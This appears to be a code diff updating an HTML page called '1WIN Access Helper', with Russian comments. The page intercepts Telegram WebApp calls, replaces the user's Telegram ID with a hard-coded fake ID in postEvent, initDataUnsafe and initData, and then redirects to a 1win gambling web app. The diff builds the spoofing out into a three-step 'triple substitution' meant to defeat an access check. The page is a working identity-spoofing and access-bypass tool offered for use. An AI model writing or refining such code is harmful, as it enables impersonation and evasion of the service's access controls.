@@ -16,6 +16,7 @@
             padding: 15px;
             border-radius: 5px;
             background: #e3f2fd;
+            font-weight: bold;
         }
         #logs {
             text-align: left;
@@ -27,58 +28,101 @@
             overflow-y: auto;
             font-family: monospace;
         }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <h2>1WIN Access Helper</h2>
-    <div id="status">Инициализация...</div>
+    <div id="status">Инициализация системы...</div>
     <div id="logs"></div>
 
     <script>
-        // Конфигурация (меняйте эти значения)
+        // КОНФИГУРАЦИЯ (МЕНЯЙТЕ ЭТИ ЗНАЧЕНИЯ)
         const FAKE_ID = 7796998065;
         const TARGET_SITE = "https://1win-soft.com/webapp/";
-        
-        // Логирование в интерфейс и консоль
-        function log(message) {
+        const VERSION = "3.0"; // Для контроля версии
+
+        // Логирование
+        function log(message, isWarning = false) {
             const logs = document.getElementById('logs');
-            logs.innerHTML += message + '\n';
+            const line = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logs.innerHTML += isWarning 
+                ? `<span class="warning">${line}</span><br>` 
+                : `${line}<br>`;
             console.log(message);
         }
-        
-        // Инициализация
-        document.getElementById('status').textContent = "Загрузка WebApp...";
-        log(`Запуск в ${navigator.userAgent}`);
-        
-        Telegram.WebApp.ready();
-        log(`WebApp инициализирован. Платформа: ${Telegram.WebApp.platform}`);
-        log(`Исходный ID: ${Telegram.WebApp.initDataUnsafe?.user?.id || 'не обнаружен'}`);
-        
-        // Перехватчик событий
-        const originalPost = Telegram.WebApp.postEvent;
-        Telegram.WebApp.postEvent = (event, data) => {
-            log(`Перехвачено событие: ${event}`);
-            
-            if (event === 'web_app_check_access') {
-                const newData = {...data, telegram_id: FAKE_ID};
-                log(`Подменяю ID на: ${FAKE_ID}`);
-                document.getElementById('status').textContent = "ID успешно подменен!";
-                return originalPost(event, newData);
-            }
-            
-            return originalPost(event, data);
-        };
-        
-        // Дополнительная подмена в initDataUnsafe
-        if (Telegram.WebApp.initDataUnsafe?.user) {
-            Telegram.WebApp.initDataUnsafe.user.id = FAKE_ID;
-            log(`Дублирующая подмена в initDataUnsafe`);
+
+        // ИНИЦИАЛИЗАЦИЯ
+        document.getElementById('status').textContent = "Запуск WebApp...";
+        log(`=== Версия ${VERSION} ===`);
+        log(`User Agent: ${navigator.userAgent}`);
+        log(`Целевой сайт: ${TARGET_SITE}`);
+        log(`Подменяемый ID: ${FAKE_ID}`);
+
+        // Проверка среды выполнения
+        if (!window.Telegram?.WebApp) {
+            log("ОШИБКА: Telegram WebApp API не обнаружен!", true);
+            document.getElementById('status').textContent = "Ошибка: Запускайте только через Telegram!";
+            throw new Error("Telegram WebApp API required");
         }
-        
+
+        Telegram.WebApp.ready();
+        log(`Платформа: ${Telegram.WebApp.platform}`);
+        log(`Исходный ID: ${Telegram.WebApp.initDataUnsafe?.user?.id || 'не обнаружен'}`);
+
+        // ТРОЙНАЯ ПОДМЕНА ID
+        function overrideId() {
+            try {
+                // 1. Подмена в postEvent
+                const originalPost = Telegram.WebApp.postEvent;
+                Telegram.WebApp.postEvent = (event, data) => {
+                    if (event === 'web_app_check_access') {
+                        data.telegram_id = FAKE_ID;
+                        log(`[1/3] Подмена в postEvent: ${FAKE_ID}`);
+                        return originalPost(event, data);
+                    }
+                    return originalPost(event, data);
+                };
+
+                // 2. Подмена в initDataUnsafe
+                if (Telegram.WebApp.initDataUnsafe?.user) {
+                    Telegram.WebApp.initDataUnsafe.user.id = FAKE_ID;
+                    log(`[2/3] Подмена в initDataUnsafe`);
+                }
+
+                // 3. Подмена в initData (если доступно)
+                if (typeof Telegram.WebApp.initData === 'string') {
+                    const initData = new URLSearchParams(Telegram.WebApp.initData);
+                    if (initData.has('user')) {
+                        const user = JSON.parse(initData.get('user'));
+                        user.id = FAKE_ID;
+                        initData.set('user', JSON.stringify(user));
+                        Telegram.WebApp.initData = initData.toString();
+                        log(`[3/3] Подмена в initData`);
+                    }
+                }
+
+                // Визуальное подтверждение
+                document.getElementById('status').textContent = 
+                    `ID успешно подменен на: ${FAKE_ID}`;
+                log(`Проверочный ID: ${Telegram.WebApp.initDataUnsafe?.user?.id}`);
+
+            } catch (e) {
+                log(`ОШИБКА ПОДМЕНЫ: ${e.message}`, true);
+                document.getElementById('status').textContent = "Ошибка подмены ID!";
+            }
+        }
+
+        // Запуск подмены
+        overrideId();
+
         // Переход через 3 секунды
         setTimeout(() => {
-            log(`Перенаправление на: ${TARGET_SITE}`);
-            document.getElementById('status').textContent = "Перенаправление на 1WIN...";
+            log(`Перенаправление на ${TARGET_SITE}`);
+            document.getElementById('status').textContent += " → Переход...";
             window.location.href = TARGET_SITE;
         }, 3000);
     </script>
